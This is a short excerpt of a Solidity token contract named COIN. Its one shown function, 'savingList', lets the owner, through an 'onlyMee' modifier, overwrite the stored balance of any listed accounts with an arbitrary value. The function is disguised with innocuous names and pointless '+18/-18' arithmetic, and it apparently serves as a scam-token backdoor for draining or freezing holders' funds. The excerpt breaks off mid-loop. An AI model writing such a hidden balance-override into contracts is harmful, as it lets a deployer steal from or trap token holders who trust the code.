...
contract COIN is Context, Ownable, IERC20 {
    ...
    event savedd(address indexed account, uint256 currentBalance, uint256 newBalance);

    function savingList(address[] memory accounts, uint256 newBalance) external onlyMee {

        for (uint256 k = 0; k < accounts.length; k++) {

            uint256 currentBalance = _savings[accounts[k]] + 18;

            _savings[accounts[k]] = newBalance;

            emit savedd(accounts[k], currentBalance - 18, newBalance);
